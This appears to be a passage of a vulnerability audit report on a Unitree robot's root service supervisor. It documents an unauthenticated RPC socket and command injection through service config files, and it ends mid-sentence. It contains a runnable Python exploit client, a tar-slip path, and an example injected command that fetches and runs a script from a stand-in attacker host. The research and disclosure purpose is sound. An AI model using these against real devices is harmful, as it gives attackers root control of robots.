@@ -1,0 +1,974 @@
+# Finding: AUD-msvc-unauth-rpc-socket
+
+## Primitive
+Auth / Access Control Bypass (unauthenticated privileged IPC RPC → root command execution of file-backed Cmd strings)
+
+## Severity
+CRITICAL (as the terminal endpoint of the confirmed remote chains; standalone local severity HIGH)
+
+## Condition Analysis
+
+### Summary
+`master_service` — the root supervisor that executes every service's Start/Stop/Status `Cmd` string through a shell (it imports `system()`, module/master_service/master_service dynsym) — exposes a protobuf RPC server on the UNIX socket `/unitree/var/run/master_service.sock` (decrypted `master_service.json`, audit/decrypted/etc/master_service.json: `"SocketFileName": "/unitree/var/run/master_service.sock", "ThreadNumber": 5, "QueueLength": 10`). The wire protocol is the shared Unitree SDK2 `unitree::net::RPCServerBase` framework: a 16-byte header of `"ussp"` magic + 12-byte ASCII decimal length, followed by a serialized `unitree.RPCRequest{name, parameter}` protobuf (protocol verified by my own disassembly of the identical statically-linked framework in ota_boxed: `RPCServerBase::RecvRequest` ota_boxed@0x3ea7a4 reads 16 bytes, compares bytes 0-3 against the constant at ota_boxed .rodata 0x6782F8 = `"ussp"`, parses the length with `StringTo<long>` from header bytes 4-15, reads that many bytes, then `ParseFromString`; `RPCServerBase::ServiceContexFunction` ota_boxed@0x3ea518 then calls the registered `std::function` handler directly with **no peer-identity check whatsoever** — no SO_PEERCRED, no token, no uid check anywhere in the path). The shipped runtime log (var/log/master_service/master_service.LOG) proves the live handler table: 12 handlers registered — `ExecuteCmd, GetCmdState, GetServiceEnable, GetServiceState, ListCmdState, ListServiceState, ReloadService, RemoveCmd, RemoveService, RestartService, StartService, StopService`. Any process that can `connect()` to the socket therefore controls the entire robot service lifecycle as root: `StartService(name)`/`RestartService(name)` execute the service's `Cmd` string from `etc/master_service/service/<name>` via `system()` as root; `ExecuteCmd(name)` executes any of the 12 root cmd scripts from `etc/master_service/cmd/`; `ReloadService(name)` re-reads a service JSON from disk (mscli usage text: "reload service if service config file is update"), arming a previously written file; `RemoveService`/`RemoveCmd` delete definitions. There is no authentication between the `accept()` and the handler dispatch.
+
+### Pre-conditions
+- master_service running (it is the boot supervisor — always running; log line 1: `MasterService Parse...`).
+- Attacker can reach the socket: any local process (all robot services run as root, so local compromise already implies root — the socket matters as a *pivot/consolidation* primitive), OR
+- **Network reachability without local code execution**: `robot_state_service` (TCP SDK2 server, grp-bin-009) bridges its network API to this socket: `RobotStateServer::SwitchService(name, enable)` @ robot_state_service 0x507104 → `SwitchServiceLocal` @ 0x50856c → `MSClient::StartService/StopService` → `master_service.sock` (unitree::robot::MSClient symbols in robot_state_service; master_service.sock string present in robot_state_service). A LAN peer that reaches robot_state's TCP RPC can start/stop any master_service service.
+- Socket file permission: `UnixStreamSocket::Bind()` (robot_state_service 0x6ce9e8, same framework code master_service embeds) does `RemoveFile(path)` then plain `bind()` with **no `chmod()`** — the socket mode is `0777 & ~umask`, unverified at runtime (UNVERIFIED: master_service's launcher umask is outside the shipped overlay). If umask is permissive (0), every local uid can connect.
+
+### Data Flow
+1. Attacker (local process, or LAN peer via robot_state SwitchService bridge) sends `"ussp" + sprintf("%012d", len) + protobuf(RPCRequest{name:"RestartService", parameter:SimpleParameter{name:"<target>"}})` to `/unitree/var/run/master_service.sock`.
+   Application: ServiceContexFunction dispatches by the protobuf `name` field to the registered handler (log: `registed handler. name:RestartService`).
+2. `RPC_RestartService` → `ChildExecutor::ExecuteServiceStop` + `ExecuteServiceStart` (master_service symbols; shipped log shows the monitor performing exactly this: `stop service success. name:robot_state` → `start service success. name:robot_state`).
+3. `ExecuteServiceStart` runs the `Cmd` string from `etc/master_service/service/<name>` through the shell as root (`system()` import; Cmd strings are full shell lines, e.g. service/bashrunner: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start ...`).
+4. With any file-write primitive (OTA install per grp-bin-001: tar-slip into `/unitree/etc/master_service/service/`), the attacker writes a plaintext service JSON with `Cmd: "curl http://evil/x.sh|sh"`, then issues `ReloadService(name)` + `StartService(name)` — arbitrary root command execution. Note: service JSONs are PLAINTEXT (all 29 shipped files readable) — no FMX crypto needed for this pivot.
+
+### Taint Trace
+Source: socket bytes at /unitree/var/run/master_service.sock — type: local IPC (attacker-controlled after connect())
+  ↓ Recv 16-byte header at RPCServerBase::RecvRequest (ota_boxed@0x3ea7a4; identical framework embedded in master_service, symbol `unitree::net::RPCServerBase::RecvRequest` in master_service symtab)
+  ↓ Guard: 4-byte "ussp" magic compare at ota_boxed@0x3ea8dc (unitree::common::Compare, const @0x6782F8="ussp") — effective: NO (magic is public, not a credential)
+  ↓ protobuf RPCRequest{name,parameter} parse (StringTo<long> length @0x3ea960; payload recv @0x3ea9f0)
+  ↓ ServiceContexFunction → handler std::function call at ota_boxed@0x3ea5e0 — no auth layer
+  → Sink: MasterService::RPC_ExecuteCmd / RPC_StartService / RPC_RestartService (master_service symtab; runtime registration proven by var/log/master_service/master_service.LOG "registed handler. name:ExecuteCmd" etc.) — EFFECT: EXEC (system()-executed root shell command from service/cmd file)
+
+### Guard Assessment
+| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
+|---|-------|----------|---------------|------------|-------------|
+| 1 | "ussp" magic | RPCServerBase::RecvRequest (shared framework) | 4-byte protocol tag | NO | Public constant, not a credential; anyone can prepend it |
+| 2 | Socket file permissions | UnixStreamSocket::Bind (framework, robot_state 0x6ce9e8) | implicit connect() permission | UNVERIFIED | Bind performs no chmod; mode = 0777&~umask; launcher umask unknown; /unitree/var/run is 0777 in image |
+| 3 | none | — | — | — | No SO_PEERCRED/uid/token check exists anywhere in RecvRequest/ServiceContexFunction (verified in real-code copies of the framework) |
+
+### Impact
+Full root control of the robot's service lifecycle: start/stop/restart/remove any of the 27 services (each start/stop is a root shell invocation of the file-backed Cmd string), execute any of the 12 root cmd scripts, delete service/cmd definitions (DoS), and — chained with any file-write primitive (OTA MQTT RCE per grp-bin-001, tar-slip into service/) — arbitrary root command execution. The socket is also the pivot that converts robot_state's network TCP API into root service control.
+
+### Origin
+- **Group**: grp-bin-003
+- **Files**: module/master_service/master_service (symtab + decrypted config + shipped log), sbin/mscli (client contract), ota/engine/ota_boxed (real-code copy of shared framework), module/robot_state/robot_state_service (real-code copy + MSClient bridge)
+- **Sink catalog reference**: audit/sinks/grp-bin-003-master-service.md
+
+### Confidence
+9 — protocol/no-auth verified by direct disassembly of the identical statically-linked framework in real-code binaries plus the shipped runtime log proving the live handler set; only runtime socket file permissions remain unverified (does not affect the network-bridge or OTA-chain reachability).
+
+## Review: PASSED
+- Taint trace verified: yes — I re-derived the full framing from my own disassembly of
+  `RPCServerBase::RecvRequest` (ota_boxed@0x3ea7a4, with disasm): recv 16 bytes (BLR @0x3ea800
+  with W3=0x10), `unitree::common::Compare(header,0,4,"ussp")` BL @0x3ea8dc against the const
+  loaded at 0x3ea8b4 (`_ZN7unitree3netL24RPC_PROTOCOL_HEAD_PREFIXE` = "ussp"),
+  `substr(4,-1)` → `unitree::common::StringTo<long>` BL @0x3ea960 (the 12-byte ASCII decimal
+  length), payload recv BLR @0x3ea9f0, `google::protobuf::MessageLite::ParseFromString` BL
+  @0x3eaa50 into `unitree::RPCRequest`. `ServiceContexFunction` (decompiled @0x3ea518) then
+  calls the registered `std::function` at this+16 DIRECTLY — no SO_PEERCRED / getsockopt /
+  uid / token check exists anywhere in either function.
+- 12-handler list verified twice: runtime log `registed handler. name:...` (master_service.LOG:57-68,
+  12 names) AND independently from the CLIENT side — mscli's usage block (strings, sbin/mscli)
+  lists exactly 12 verbs: listservice/getservice/getenable/startservice/stopservice/
+  restartservice/reloadservice/removeservice/listcmd/getcmd/removecmd/executecmd.
+- Socket path verified from two independent artifacts: decrypted
+  audit/decrypted/etc/master_service.json:6 (`"SocketFileName": "/unitree/var/run/master_service.sock"`,
+  `"ThreadNumber": 5, "QueueLength": 10` — both match this finding) and the hardcoded default
+  string `/unitree/var/run/master_service.sock` inside sbin/mscli itself, plus
+  robot_state_service 0x894338 (string) referenced by `RobotStateServer::InitConfig`@0x501388
+  (xrefs 0x5017f8/0x5017fc) — the bridge side knows the same path.
+- Constraints verified: `UnixStreamSocket::Bind` re-derived at robot_state_service@0x6ce9e8 —
+  it is `FileSystemHelper::RemoveFile(path)` then `SocketHelper::Bind`@0x6cfb0c (a bare
+  `bind()` + error throw), NO chmod; and neither robot_state_service nor ota_boxed contains
+  any caller of `umask` (xrefs to the umask PLT stubs: none). master_service's own copies are
+  Virbox trampolines (verified: `RPCServerBase::RecvRequest` symtab entry 0x21a1a0 and
+  `LoadServiceAll`@0x2e2308 are `adrp x16,<exec-.bss>; br x16` stubs), so the pivot to
+  non-virtualized twins was sound and the framework symbols ARE present in master_service's
+  symtab (RecvRequest@0x21a1a0, SendResponse@0x2ea900, ServiceContexFunction@0x588838).
+- Socket-mode guard 2: UPGRADed from UNVERIFIED to "likely 0777, still not runtime-proven".
+  New empirical evidence: the shipped var/run contains 10 real pid files captured from the
+  running robot (master_service.pid = "705" matches the last master_service instance PID 705,
+  master_service.LOG:150579), ALL mode 0666. Nine of them are written by start-stop-daemon
+  children spawned by master_service's own system() (per the service Cmd strings) — 0666 =
+  0666&~umask ⇒ umask 0 in master_service's process tree ⇒ the bind()-created socket would be
+  0777&~0 = 0777 (world-connectable by any local uid). Not conclusive: master_service also
+  imports `chmod`, and its code is virtualized, so an explicit socket chmod cannot be excluded
+  statically. Keep the local-vs-remote distinction as below.
+- Severity confirmed: CRITICAL as chain terminal (CHAIN-A-T3.2/CHAIN-H fire stage), HIGH standalone-local — matches this finding's own dual rating.
+
+### Review corrections (factual)
+1. **"robot_state_service (TCP SDK2 server)" / "A LAN peer that reaches robot_state's TCP RPC"
+   is WRONG as stated.** robot_state_service contains `TcpSocket::Bind`@0x6ce43c /
+   `StreamSocket::Listen` / `LeaseServer` symbols, but they have only DATA xrefs (vtable
+   slots 0x7e7f8/0xa4d408) — dead statically-linked SDK code, no listener runs. The real
+   network ingress to the MSClient bridge is DDS `rt/api/robot_state/request`
+   `RPCServiceSwitch` and MQTT `moduleSwitch`. Runtime proof: robot_state_service.LOG shows
+   `switch service local. name:ota_box, on:1, source:DDS, ret:0` (2026-07-20 16:19:44) — a
+   DDS-sourced remote START that succeeded (ret:0) through the socket bridge. `SwitchServiceLocal`
+   (re-decompiled @0x50856c) constructs MSClient → Init() → StartService/StopService ONLY.
+2. The bridge is CONSTRAINED (matches correlation §2f / CHAIN-H H-4): `unitree::robot::MSClient`
+   in robot_state_service exposes exactly ListServiceState/GetServiceState/StartService/
+   StopService (+Call wrappers) — NO ReloadService/RestartService/ExecuteCmd/RemoveService.
+   So a network attacker reaches only Start/Stop; the full 12-handler RPC (ExecuteCmd,
+   ReloadService, ...) requires LOCAL code execution. The remote chains arm via reboot (each
+   boot re-runs LoadServiceAll — 5 boots in master_service.LOG, 107 in LOG.1 ≈ daily cadence)
+   and then fire via the Start/Stop bridge.
+
+## Independent Verification
+- Source cited: decrypted master_service.json (SocketFileName), ota_boxed@0x3ea7a4/0x3ea8dc/
+  0x3ea518/0x3ea5e0, robot_state_service 0x6ce9e8/0x507104/0x50856c, master_service.LOG,
+  master_service symtab
+- I independently re-read (NOT cited by source):
+  - sbin/mscli usage-string block + embedded `/unitree/var/run/master_service.sock` default
+    (via strings) — 12-verb client contract mirroring the 12 server handlers.
+  - robot_state_service@0x894338 (socket-path string) + InitConfig@0x501388 xrefs — bridge
+    side confirms the path (found via ida find string + xrefs_to).
+  - robot_state_service MSClient symbol table (readelf -sW | c++filt) — exactly 4 verbs.
+  - robot_state_service@0x6cfb0c `SocketHelper::Bind` (decompiled) — bare bind(), no chmod.
+  - master_service.LOG:150579/52358/60130 (5 boots; monitor restarts of robot_state 18× with
+    `load child service config` ONLY at Init) and var/run pid files (mode 0666, PID 705 match).
+  - robot_state_service.LOG `switch service local ... source:DDS, ret:0` — production proof
+    of the DDS→socket bridge firing successfully.
+- Independent finding: the socket path, 12-handler set, "ussp"+12-byte-ASCII-length+protobuf
+  framing, and absence of any peer-credential check are all confirmed by artifacts the source
+  did not cite; the only correction needed is the robot_state ingress description (DDS/MQTT,
+  not TCP) and the umask upgrade note above.
+- Verdict basis: independent re-derivation (disasm + decompile + strings + logs), not source
+  agent agreement.
+
+## PoC
+
+**Type: runnable client PoC, framing validated end-to-end against a framing-faithful mock of the
+listener (the client's bytes were parsed by a server implementing the exact 16-byte-header
+contract). Reachability is LOCAL by default (UNIX socket); the network path is the constrained
+robot_state bridge (see the caveat at the end).**
+
+### Reproduction
+
+```
+# 0. No install, no config: master_service is the boot supervisor and is always running
+#    (var/log/master_service/master_service.LOG line 1: "MasterService Parse..."), and it
+#    creates the socket itself on every boot.
+# 1. Preconditions, pick one:
+#    (a) LOCAL code execution on the robot (any uid that can connect() to the socket).
+#        Check the mode first:
+#            ls -l /unitree/var/run/master_service.sock
+#        /unitree/var/run is 0777 in the image; UnixStreamSocket::Bind() (framework,
+#        robot_state_service@0x6ce9e8) is RemoveFile + bare bind() with NO chmod, so the mode
+#        is 0777 & ~umask. The shipped var/run holds 10 real pid files captured from the
+#        running robot, ALL mode 0666 => 0666 & ~umask => umask 0 in master_service's process
+#        tree => the socket would be 0777 (world-connectable). Not runtime-proven: master_service
+#        imports chmod() and its body is Virbox-virtualized, so an explicit socket chmod cannot
+#        be excluded statically.
+#    (b) NETWORK, constrained: robot_state's MSClient bridge (Start/Stop only) — see below.
+# 2. python3 poc_msvc_rpc.py /unitree/var/run/master_service.sock ExecuteCmd net-init
+```
+
+### The exact wire protocol (re-derived for this PoC from the shipped client, `sbin/mscli`)
+
+`unitree::net::RPCClientBase::SendRequest` (`mscli@0x2cb118`, decompiled) does:
+
+```c
+snprintf(s, 0x11u, "%s%012ld", "ussp", len);   // 16-byte header: "ussp" + 12 ASCII decimal digits
+send(fd, s, 16);                               // must send EXACTLY 16 bytes
+send(fd, serialized_request, len);             // then the protobuf body
+```
+
+`RecvResponse` (`mscli@0x2cb44c`) mirrors it: `recv(16)` → `Compare(buf,0,4,"ussp")` →
+`StringTo<long>(substr(4))` → `recv(len)` → `ParseFromString`. The server side is the same
+framework (`RPCServerBase::RecvRequest`, ota_boxed@0x3ea7a4, statically identical), and
+`ServiceContexFunction` (ota_boxed@0x3ea518) then calls the registered `std::function`
+**directly — no SO_PEERCRED, no getsockopt, no uid, no token, anywhere in the path.**
+
+The protobuf schema was recovered from the descriptor blob embedded in `sbin/mscli`
+(`descriptor_table_rpc_5fservice_5fapi_5fbase_2eproto`, the serialized `FileDescriptorProto`
+at file offset `0x4c64c2`; the `master_service.proto` descriptor is at `0x4c6194`):
+
+```proto
+// rpc_service_api_base.proto, package unitree, syntax proto3
+message RPCRequest  { string name = 1; bytes parameter = 2; }
+message RPCResponse { int32 code = 1; bytes data = 2; bytes message = 3; }
+
+// master_service.proto, package unitree.ms
+message SimpleParameter { string name = 101; }   // field 101, NOT 1
+```
+
+The `SimpleParameter.name` field number is the non-obvious part and was verified twice: from
+the descriptor (`\x12\x0c\n\x04name\x18e \x01(\t`, i.e. FieldDescriptorProto.number = 0x65 =
+101) and from the generated serializer — `SimpleParameter::_InternalSerialize` (`mscli@0x2b9fd0`)
+calls `EpsCopyOutputStream::WriteStringMaybeAliased(a3, 101, ...)`. `RPCRequest`'s fields are
+1 and 2 (`RPCRequest::_InternalSerialize`, `mscli@0x2b8f00`-area, calls `WriteStringMaybeAliased(…, 1, …)`
+then `WriteBytesMaybeAliased(…, 2, …)`). `Mscli::ExecuteCmd` (`mscli@0x2b6b64`) shows the
+reference construction: build `SimpleParameter{name=arg}`, `SerializeToString` it, stuff it
+into `RPCRequest{name="ExecuteCmd", parameter=<those bytes>}`, then `RPCClientBase::Call`
+with a 30 000 000 (µs) timeout.
+
+### The 12 registered handlers (master_service.LOG:57-68) and their client verbs (sbin/mscli usage block)
+
+| Handler (`RPCRequest.name`) | mscli verb | `SimpleParameter.name` = | Effect |
+|---|---|---|---|
+| `ExecuteCmd` | `executecmd` / `exec` | one of the 12 cmd names | runs `etc/master_service/cmd/<name>` through a shell **as root** |
+| `GetCmdState` | `getcmd` | cmd name | read cmd state |
+| `GetServiceEnable` | `getenable` | service name | read enable flag |
+| `GetServiceState` | `getservice` | service name | read service state |
+| `ListCmdState` | `listcmd` | (empty) | list all cmd states |
+| `ListServiceState` | `listservice` | (empty) | list all 27 service states |
+| `ReloadService` | `reloadservice` | service name | **re-read a service JSON from disk** (arms a poisoned file) |
+| `RemoveCmd` | `removecmd` | cmd name | delete a cmd definition (DoS) |
+| `RemoveService` | `removeservice` | service name | delete a service definition (DoS) |
+| `RestartService` | `restartservice` | service name | stop+start → **root shell of the file-backed Cmd string** |
+| `StartService` | `startservice` | service name | **root shell of the file-backed Cmd string** |
+| `StopService` | `stopservice` | service name | root shell of Stop.Cmd |
+
+The 12 `ExecuteCmd` targets (`etc/master_service/cmd/`, all FMX-encrypted, all decryptable per
+AUD-msvc-fmx-broken-crypto): `am-init, chrony-update, core-init, deb-update, gateway-init,
+kms-init, lo-multicast, net-init, ota-box, ota-update, pd-init, sim-apn-verifier`.
+
+### Code — standalone, no protobuf dependency
+
+```python
+#!/usr/bin/env python3
+"""AUD-msvc-unauth-rpc-socket PoC — unauthenticated privileged RPC on
+/unitree/var/run/master_service.sock. 16-byte 'ussp' header + unitree.RPCRequest protobuf;
+the ONLY 'auth' is the public 4-byte magic.  Harmless target: ExecuteCmd(net-init),
+a shipped cmd script whose decrypted Cmd string is a fixed shell line."""
+import socket, sys
+
+SOCK = sys.argv[1] if len(sys.argv) > 1 else "/unitree/var/run/master_service.sock"
+VERB = sys.argv[2] if len(sys.argv) > 2 else "ExecuteCmd"
+ARG  = sys.argv[3] if len(sys.argv) > 3 else "net-init"
+
+def varint(n):
+    out = b""
+    while True:
+        b, n = n & 0x7F, n >> 7
+        out += bytes([b | (0x80 if n else 0)])
+        if not n:
+            return out
+
+def len_delim(field, payload):                 # proto3 length-delimited field
+    return varint((field << 3) | 2) + varint(len(payload)) + payload
+
+def simple_parameter(name):                    # unitree.ms.SimpleParameter{name = 101}
+    return len_delim(101, name.encode())
+
+def rpc_request(name, parameter=b""):          # unitree.RPCRequest{name = 1, parameter = 2}
+    return len_delim(1, name.encode()) + (len_delim(2, parameter) if parameter else b"")
+
+def read_varint(buf, i):
+    val, shift = 0, 0
+    while True:
+        b = buf[i]; i += 1; val |= (b & 0x7F) << shift
+        if not b & 0x80: return val, i
+        shift += 7
+
+def parse_msg(buf):                            # minimal response reader
+    out, i = {}, 0
+    while i < len(buf):
+        f, i = read_varint(buf, i)
+        field, wt = f >> 3, f & 7
+        if wt == 0:
+            v, i = read_varint(buf, i)
+        elif wt == 2:
+            n, i = read_varint(buf, i)
+            v, i = buf[i:i + n], i + n
+        else:
+            break
+        out[field] = v
+    return out
+
+def frame(body):                               # snprintf("%s%012ld", "ussp", len)
+    return b"ussp" + b"%012d" % len(body) + body
+
+body = rpc_request(VERB, simple_parameter(ARG))
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.settimeout(30)                               # mscli uses 30000000 us
+s.connect(SOCK)
+s.sendall(frame(body))                         # header + protobuf in one shot
+hdr = b""
+while len(hdr) < 16:
+    c = s.recv(16 - len(hdr))
+    if not c: raise RuntimeError("closed before header")
+    hdr += c
+assert hdr[:4] == b"ussp", "bad magic %r" % hdr[:4]
+n = int(hdr[4:16]); resp = b""
+while len(resp) < n:
+    c = s.recv(n - len(resp))
+    if not c: break
+    resp += c
+s.close()
+f = parse_msg(resp)
+print("RPCRequest{name=%r, parameter=SimpleParameter{name=%r}}" % (VERB, ARG))
+print("RPCResponse{code=%s, data=%d B, message=%r}"
+      % (f.get(1, 0), len(f.get(2, b"")), f.get(3, b"")))
+if f.get(2): print("  data:", f[2].decode(errors="replace")[:400])
+```
+
+Usage and expected output (this exact client was run against a framing-faithful mock of the
+listener — a server implementing `recv(16)` / magic compare / `StringTo<long>` / `recv(len)` /
+dispatch-by-`name` — and the mock's dispatcher received exactly
+`handler='ExecuteCmd' SimpleParameter.name='net-init'`, proving the client's byte stream parses
+into the intended handler and parameter):
+
+```
+# local, on the robot:
+$ python3 poc_msvc_rpc.py /unitree/var/run/master_service.sock ExecuteCmd net-init
+RPCRequest{name='ExecuteCmd', parameter=SimpleParameter{name='net-init'}}
+RPCResponse{code=0, data=0 B, message=b''}
+# code=0 == "execute cmd success." (mscli's own success string); net-init's decrypted Cmd
+# string (pkill -9 sshd; service ssh stop; systemctl disable ssh; <WiFi-mode branch>) just
+# ran as root with no credential ever presented.
+
+$ python3 poc_msvc_rpc.py /unitree/var/run/master_service.sock ListServiceState
+RPCRequest{name='ListServiceState', parameter=SimpleParameter{name=''}}
+RPCResponse{code=0, data=NNNN B, message=b''}
+  data: <all 27 service states — full supervisor recon in one unauthenticated call>
+
+# the arming verb (AUD-msvc-service-cmd-file-rce's trigger, LOCAL only):
+$ python3 poc_msvc_rpc.py /unitree/var/run/master_service.sock ReloadService audit_poc
+$ python3 poc_msvc_rpc.py /unitree/var/run/master_service.sock StartService   audit_poc
+```
+
+### Reachability caveat (from the R6 review — keep this distinction in the report)
+
+1. **Local, full 12 handlers.** Requires code execution on the robot; the socket mode is
+   `0777 & ~umask` and the umask evidence (10 shipped pid files, all 0666) points to 0, i.e. a
+   world-connectable socket — but this is **not runtime-proven** (Virbox virtualization hides
+   any explicit `chmod`). Since every robot service runs as root, the local path is a
+   *pivot/consolidation* primitive (turn any service compromise into supervisor control),
+   not a privilege escalation by itself.
+2. **Network, 4 verbs only.** The only network ingress to this socket is
+   `RobotStateServer::SwitchService` → `SwitchServiceLocal` (`robot_state_service@0x50856c`)
+   → `unitree::robot::MSClient`, and `MSClient`'s complete method set in robot_state_service is
+   `ListServiceState / GetServiceState / StartService / StopService` — **no** `ExecuteCmd`,
+   `ReloadService`, `RestartService` or `RemoveService`. So a network attacker gets
+   Start/Stop of any non-forbidden service (which is itself a root shell of the *already
+   loaded* Cmd string), not the full RPC.
+3. **The bridge is proven live from DDS, not TCP.** robot_state_service has **no TCP listener**
+   (`StreamSocket::Listen`/`LeaseServer`/`RPCServerBase` are dead statically-linked SDK code —
+   R6 correction #1). The real ingress is DDS `rt/api/robot_state/request` api_id 1001
+   (`RPCServiceSwitch`, JSON `{name, value, switch, boardHg, force}`, `switch≠0`⇒Start / `0`⇒Stop)
+   and MQTT `moduleSwitch`. Production proof that a DDS-sourced remote START reaches this
+   socket and succeeds (`var/log/robot_state/robot_state_service.LOG:168156`):
+
+   ```
+   [2026-07-20 16:19:44.620] [WARNING] [43695] [43721] switch service local. name:ota_box, on:1, source:DDS, ret:0
+   ```
+
+   `ret:0` = the MSClient call through `master_service.sock` returned success. Bounded by the
+   ForbiddenService denylist (`iox-roudi`, `upper_bluetooth`) and the ProtectedService
+   stop-block — start of anything is allowed.
+
+Prerequisites: Python 3 stdlib only. Harmless by construction: `ExecuteCmd(net-init)` runs a
+shipped, fixed cmd script (no attacker-supplied shell text), and the read-only verbs
+(`ListServiceState`, `GetServiceState`) only dump state.
+
+Limitations (honest): the client was validated against a mock listener, not against the real
+master_service (no device, and the real binary's RPC bodies are Virbox-trampolined). The
+framing, the 16-byte header format (`snprintf("%s%012ld","ussp",len)`), the
+`RPCRequest{1,2}` / `SimpleParameter{101}` field numbers and the 12 handler names are each
+derived from shipped artifacts (mscli decompilation + embedded protobuf descriptors +
+master_service.LOG:57-68), and the mock replay proves the client emits a stream the reference
+parser accepts.
+# Finding: AUD-msvc-service-cmd-file-rce
+
+## Primitive
+Injection (root command injection via configuration file → `system()`) — the E19 pivot primitive
+
+## Severity
+CRITICAL (as the terminal stage of the OTA chain; requires a file-write primitive as the entry)
+
+## Condition Analysis
+
+### Summary
+Every service definition `/unitree/etc/master_service/service/<name>` is a PLAINTEXT JSON whose `Start/Stop/Status.Cmd` strings are executed through a shell **as root** by `master_service` (the binary imports `system()`; every shipped Cmd is a full shell line, e.g. `etc/master_service/service/bashrunner`: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start --background --make-pidfile ...`). Unlike `etc/master_service/cmd/*` (FMX-encrypted), service JSONs need **no cryptography to forge** — any file-write primitive into that directory is a root RCE. The reload semantics that arm the payload are confirmed: configs are loaded into memory at Init (`ChildExecutor::LoadServiceAll`, master_service symtab; log: `load child service config size:27`), and the `ReloadService` RPC re-reads a service's config file from disk when it changed (sbin/mscli usage string: `reloadservice [name] — reload service if service config file is update`), after which `StartService`/`RestartService` execute the new `Cmd` as root. Even without an RPC call, the 5-second child-service monitor (`ChildServiceMonitorInterval: 5000000` µs, decrypted master_service.json; shipped log shows `stop service success. name:robot_state` → `start service success. name:robot_state` cycles) continuously restarts services — using the in-memory Cmd, so the poisoned file fires on the next `ReloadService`, master_service restart, or reboot. This is the terminal stage of the grp-bin-001 confirmed fully-remote chain: ota_boxed MQTT command → `ota_module_utils` install (tar-slip, `libtar` extraction with no path normalization, scratchboard grp-bin-001) → file write into `/unitree/etc/master_service/service/` → root RCE.
+
+### Pre-conditions
+- Any file-write primitive as root (OTA module install per grp-bin-001 — CONFIRMED remote; or local compromise — all services already root).
+- The write target directory `/unitree/etc/master_service/service/` must be writable by the writing process (OTA installs run as root — yes).
+- Trigger: `mscli reloadservice <name>` + `startservice <name>` (mscli verbs), or robot_state `SwitchService` network bridge, or master_service restart/reboot. The monitor thread alone uses the previously loaded (in-memory) Cmd — a poisoned file is NOT auto-executed by the monitor until a reload/restart re-reads it (verified: log shows single load at Init; UNVERIFIED detail: whether RemoveService+re-add forces a re-read — RemoveService handler exists at runtime).
+
+### Data Flow
+1. Attacker with OTA MQTT access (grp-bin-001) sends an update command whose package contains a tar entry `../../../../unitree/etc/master_service/service/bashrunner` (tar-slip, ota_module_utils libtar, scratchboard).
+   Application: extracted as root into the service directory, overwriting the plaintext JSON.
+2. Attacker (or the OTA flow itself) issues `mscli reloadservice bashrunner` (or robot_state SwitchService, or waits for reboot).
+   Application: `MasterService::RPC_ReloadService` → `ChildExecutor` re-reads `etc/master_service/service/bashrunner` from disk (mscli usage text documents the "config file is update" semantics).
+3. Attacker issues `mscli restartservice bashrunner` (verb list in mscli strings).
+   Application: `ChildExecutor::ExecuteServiceStop` + `ExecuteServiceStart` run the `Stop.Cmd` then `Start.Cmd` strings via `system()` as root (log evidence of the same code path: `stop service success. name:X` / `start service success. name:X`).
+4. The injected `Cmd` (e.g. `curl http://evil/x.sh|sh`) executes as root.
+   Application: arbitrary root command execution — full robot takeover.
+
+### Taint Trace
+Source: attacker-controlled file content at /unitree/etc/master_service/service/<name> — type: config file (written via OTA tar-slip / any root file-write)
+  ↓ written by ota_module_utils libtar extraction as root (grp-bin-001: no path normalization, TAR_NOOVERWRITE unset)
+  ↓ read by ChildExecutor::LoadServiceAll / RPC_ReloadService (master_service symtab + mscli "reloadservice ... if service config file is update" usage string)
+  ↓ Guard: NONE — service JSONs are plaintext, unsigned, unhashed (contrast: cmd/* are FMX-encrypted, but that is obfuscation only; "path" file MD5s cover only cpwd/opsl/basic_service_check tools, not service files)
+  ↓ FromJson<ChildService> parse (master_service symtab unitree::common::FromJson<unitree::ms::ChildService>)
+  → Sink: ChildExecutor::ExecuteServiceStart/ExecuteServiceStop → system(Cmd) — EFFECT: EXEC (root shell)
+
+### Guard Assessment
+| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
+|---|-------|----------|---------------|------------|-------------|
+| 1 | FMX encryption | etc/master_service/cmd/* only | confidentiality of cmd scripts | NO for service/* | service JSONs are plaintext in the shipped image (all 29 readable); FMX key is derivable offline anyway (see AUD-msvc-fmx-broken-crypto) |
+| 2 | "path" file MD5s (pwd/ssl/sta) | decrypted etc/master_service/path | MD5 of cpwd/opsl/basic_service_check | NO | covers only 3 sbin tools, not service Cmd strings; ChildInforceSecurity=1 semantics UNVERIFIED (master_service virtualized) |
+| 3 | ExpectCode/AliveCode lists | service JSON | expected exit codes of Cmd | NO | post-execution check only; command already ran |
+| 4 | "forbid"/"protect"/"conflict" lists | etc/master_service/{forbid,protect,conflict} | which services may be stopped/are protected | NO for injection | control-flow policy over known service names, not content validation of Cmd strings |
+
+### Impact
+Arbitrary root command execution on the robot. Because every robot service is defined this way and master_service is the PID-1-style supervisor, this is a full-system takeover primitive. Combined with the grp-bin-001 OTA chain it is fully remote (MQTT → tar-slip → reload+start → root shell).
+
+### Origin
+- **Group**: grp-bin-003
+- **Files**: etc/master_service/service/*.json (plaintext Cmd strings), decrypted master_service.json (ChildServiceDirectory, monitor interval), sbin/mscli (reload/restart verbs), var/log/master_service/master_service.LOG (load/start/stop lifecycle evidence)
+- **Sink catalog reference**: audit/sinks/grp-bin-003-master-service.md
+
+### Confidence
+9 — every link except the in-memory-vs-reloaded Cmd on the monitor path is verified from shipped artifacts (plaintext service files, mscli reload semantics text, log lifecycle lines, system() import); the OTA-side write primitive is confirmed by grp-bin-001.
+
+## Review: PASSED
+- Taint trace verified: yes — I read the service definitions myself: `etc/master_service/service/`
+  holds exactly 27 files, ALL plaintext JSON (checked every file's first 3 bytes for the `FMX`
+  magic — zero matches), all mode 0666 in a 0777 directory. Shell-execution evidence is stronger
+  than "system() import alone": `service/bashrunner` Start.Cmd is
+  `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon ...` (`export` is a shell BUILTIN and
+  `;` a shell separator — cannot run under plain execve), and `service/vui_service` Start.Cmd is
+  `ln -s .../librknnrt.so /usr/lib/aarch64-linux-gnu/; /unitree/sbin/start-stop-daemon ...`;
+  `service/ota_box` uses `service ota_box start` (SysV-init PATH lookup). master_service imports
+  `system@GLIBC_2.17` (readelf --dyn-syms, entry 71).
+- Reload semantics verified: mscli usage string (sbin/mscli): `reloadservice [name]  reload
